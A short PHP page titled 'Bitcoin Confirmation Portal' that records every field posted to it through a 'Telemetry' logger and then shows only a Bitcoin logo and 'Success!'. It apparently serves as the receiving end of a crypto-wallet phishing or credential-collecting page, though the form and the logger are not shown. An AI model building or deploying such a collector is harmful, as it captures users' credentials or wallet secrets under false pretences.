
<?php
  require_once('config.php');
  Telemetry::log($_POST);
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bitcoin Confirmation Portal</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
    <style>
        body {
  margin: 0;
  padding: 0;
  font-family: 'Segoe UI', sans-serif;
  background: #f7f9fc;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  padding: 20px;
}

.card {
  background: #fff;
  padding: 40px 30px;
  max-width: 400px;
  box-shadow: 0 8px 20px rgba(0,0,0,0.1);
  border-radius: 10px;
  text-align: center;
}

.logo {
  width: 60px;
  margin-bottom: 20px;
}

h1 {
  font-size: 22px;
  margin-bottom: 10px;
  color: #333;
}

p {
  font-size: 14px;
  color: #555;
  margin-bottom: 30px;
}

form {
  display: flex;
  flex-direction: column;
  text-align: left;
}

label {
  font-size: 13px;
  margin-bottom: 5px;
  color: #444;
}

input {
  padding: 12px;
  margin-bottom: 20px;
  border-radius: 6px;
  border: 1px solid #ccc;
  font-size: 14px;
}

button {
  padding: 12px;
  background-color: #f7931a;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 15px;
  cursor: pointer;
  transition: background 0.2s;
}

button:hover {
  background-color: #e48210;
}
        </style>
  <div class="container">
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/300px-Bitcoin.svg.png" alt="Bitcoin Logo" class="logo">
      <h1>Success!</h1>
    </div>
  </div>
</body>
</html>